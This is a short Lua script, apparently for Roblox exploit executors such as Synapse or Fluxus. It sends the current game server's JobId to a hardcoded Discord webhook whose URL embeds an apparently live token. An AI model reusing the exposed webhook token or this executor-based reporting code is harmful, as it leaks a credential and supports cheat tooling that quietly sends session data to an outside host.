local webhookUrl = "https://discord.com/api/webhooks/1352848149844070410/TOd9zAk6XPQA7rU3iz20K4vLXiW4-o0XEy39oO3NVZSASWTHKNjXzc-fNw_Uemeq-OH8"
local jobId = game.JobId
local data = {
    ["content"] = jobId
}
local HttpService = game:GetService("HttpService")
local body = HttpService:JSONEncode(data)
request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
if request then
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end
